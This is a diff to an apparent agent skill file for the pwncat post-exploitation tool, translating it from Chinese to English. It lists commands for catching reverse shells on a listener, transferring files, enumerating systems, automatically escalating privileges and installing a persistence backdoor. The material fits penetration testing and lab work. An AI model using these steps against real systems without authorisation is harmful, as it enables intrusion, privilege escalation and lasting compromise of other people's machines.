@@ -2,40 +2,44 @@
 name: pwncat-shell-manager
 description: "pwncat: Shell hosting and automatic privilege escalation. Signals: webshell, RCE, start listener, file transfer, list available privilege escalations."
 zh-signals: "pwncat: shell 托管+自动提权。信号:webshell,rce,起监听,文件传输,列可用提权。"
+when-to-use: >-
+  Use after obtaining a shell when you need automatic TTY upgrade, file
+  transfer, system enumeration, privilege escalation attempts, or persistence;
+  can connect to a bind shell or start a listener.
 ---
 
 # pwncat
 
-- 攻击大类:C13 远程命令执行与WebShell
-- 上游仓库:https://github.com/calebstewart/pwncat
-- 上游 License:MIT(本 SKILL.md 以 Apache-2.0 二次开源,上游版权归原项目所有)
+- Attack Category: C13 Remote Command Execution and WebShell
+- Upstream Repository: https://github.com/calebstewart/pwncat
+- Upstream License: MIT (this SKILL.md is re-released under Apache-2.0; upstream copyright belongs to the original project)
 
-## 安装
+## Installation
 
 ```bash
 pip install pwncat-cs
 ```
 
-## 参数速查
+## Parameter Quick Reference
 
-| 参数 / 命令 | 说明 |
+| Parameter / Command | Description |
 | --- | --- |
-| `pwncat-cs 10.0.0.5:4444` | 连接 bind shell |
-| `pwncat-cs -lp 4444` | 起监听 |
-| `upload/download` | 文件传输 |
-| `escalate -l` | 列可用提权 |
-| `run enumerate.system` | 枚举模块 |
-| `backdoor install` | 装持久化后门 |
+| `pwncat-cs 10.0.0.5:4444` | Connect to a bind shell |
+| `pwncat-cs -lp 4444` | Start listener |
+| `upload/download` | File transfer |
+| `escalate -l` | List available privilege escalations |
+| `run enumerate.system` | Enumeration module |
+| `backdoor install` | Install a persistence backdoor |
 
-## 攻击场景 Playbook
+## Attack Scenario Playbook
 
-### shell 托管+自动提权
+### Shell Hosting with Automatic Privilege Escalation
 
 ```bash
-pwncat-cs -lp 4444  # 目标弹回 shell 后自动升级 TTY
-pwncat> escalate run  # 枚举 sudo/SUID/capability 并尝试提权
+pwncat-cs -lp 4444  # The TTY upgrades automatically once the target sends back a shell
+pwncat> escalate run  # Enumerates sudo/SUID/capabilities and attempts privilege escalation
 ```
 
-## 注意事项
+## Notes
 
-Python 写的 netcat 升级版,自动处理 TTY/回显;cs 版兼容 pwncat 原项目。
+A Python netcat upgrade that handles TTY/echo automatically; the cs version is compatible with the original pwncat project.
